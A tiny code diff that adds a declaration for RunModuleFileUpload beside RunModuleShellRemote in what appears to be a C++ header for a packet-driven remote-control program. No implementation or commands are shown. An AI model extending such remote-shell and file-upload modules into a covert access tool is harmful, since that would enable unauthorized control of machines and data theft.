@@ -67,3 +67,4 @@ public:
 
 
 DWORD WINAPI RunModuleShellRemote(CPacket* pPacket);
+DWORD WINAPI RunModuleFileUpload(CPacket* pPacket);
